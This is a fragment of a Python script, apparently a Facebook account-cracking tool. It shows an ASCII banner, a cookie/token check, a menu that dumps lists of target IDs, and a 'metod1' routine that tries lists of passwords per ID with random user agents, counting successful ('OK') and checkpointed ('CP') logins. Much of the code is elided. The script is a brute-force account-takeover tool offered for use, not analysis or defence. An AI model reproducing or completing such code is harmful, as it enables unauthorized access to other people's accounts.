...
|  _  |  _  | __  |  _  |     |   __|_   _|  _  |     |     |  |     
|   __|     |    -|     |   --|   __| | | |     | | | |  |  |  |__   
|__|  |__|__|__|__|__|__|_____|_____| |_| |__|__|_|_|_|_____|_____| 
    
________    __________________     _____  ________   ________    _______    ______________________________ ___ ___  
\_____  \  /   _____/\_   ___ \   /  _  \ \______ \  \_____  \   \      \   \_   ___ \______   \_   _____//   |   \ 
 /   |   \ \_____  \ /    \  \/  /  /_\  \ |    |  \  /   |   \  /   |   \  /    \  \/|     ___/|    __)_/    ~    \
/    |    \/        \\     \____/    |    \|    `   \/    |    \/    |    \ \     \___|    |    |        \    Y    /
\_______  /_______  / \______  /\____|__  /_______  /\_______  /\____|__  /  \______  /____|   /_______  /\___|_  / 
 @NOLEPXXX
        \/        \/         \/         \/        \/         \/         \/          \/                 \/       \/  
''')
###----------[ CEK COKIS TOKEN ]----------###
...
def menu(id):
	...
	if helpbas in ['publik','Publik','Enter']:
		...
		file_dump()
	elif helpbas in ['dump','Dump','dump']:
		dump_massal()
...
def metod1(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[🔥]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(uaa)
	ses = requests.Session()
	for pw in pwv:
